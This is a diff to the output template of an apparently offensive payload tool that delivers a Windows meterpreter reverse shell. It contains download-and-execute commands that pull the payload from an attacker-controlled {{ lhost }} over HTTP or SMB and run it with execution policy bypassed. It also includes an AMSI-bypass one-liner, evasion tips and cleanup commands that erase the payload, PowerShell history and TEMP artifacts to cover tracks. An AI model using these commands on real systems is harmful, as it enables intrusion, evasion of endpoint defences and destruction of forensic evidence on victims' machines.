@@ -109,12 +109,19 @@ output:
     powershell -ep bypass -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
     ```
 
-    Alternative (SMB):
-    $ impacket-smbserver share . -smb2support
-    On target:
-    $ copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && powershell -ep bypass -File {{ output_file }}
+    # Alternative (SMB):
 
-    Notes:
+    **Attacker:**
+    ```bash
+    smbserver.py share {{ output_path }}/{{ output_file }} -smb2support
+    ```
+
+    **Target:**
+    ```cmd
+    copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && powershell -ep bypass -File {{ output_file }}
+    ```
+
+    # Notes:
     - Payload type: windows/x64/meterpreter/{{ payload_type }}
     - EXITFUNC=thread ensures clean thread termination
     - Add-Type compiles C# code and leaves artifacts in %TEMP% directory (temporary C# source files, compiled DLL assemblies)
@@ -126,7 +133,7 @@ output:
     - For better OPSEC, use reflective loading techniques instead of Add-Type
     - Reverse shell connects to {{ lhost }}:{{ lport }}
 
-    Troubleshooting:
+    # Troubleshooting:
     - Execution policy blocks: Use -ExecutionPolicy Bypass flag (already included in examples)
     - AMSI blocks: Implement AMSI bypass before execution: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
     - AV blocks: Add obfuscation with Invoke-Obfuscation or use reflective techniques
@@ -136,10 +143,15 @@ output:
     - Detection: Add-Type cmdlet logged in PowerShell transcripts (Event ID 4104), compilation events in Windows logs
     - Memory allocation with RWX triggers EDR alerts
 
-    Cleanup:
-    On target:
-    $ Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
-    $ Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-    Clean TEMP artifacts:
-    $ Remove-Item $env:TEMP\*.dll -Force -ErrorAction SilentlyContinue
-    $ Remove-Item $env:TEMP\*.cs -Force -ErrorAction SilentlyContinue
+    # Cleanup:
+    **On target:**
+    ```powershell
+    Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    ```
+
+    **Clean TEMP artifacts:**
+    ```powershell
+    Remove-Item $env:TEMP\*.dll -Force -ErrorAction SilentlyContinue
+    Remove-Item $env:TEMP\*.cs -Force -ErrorAction SilentlyContinue
+    ```
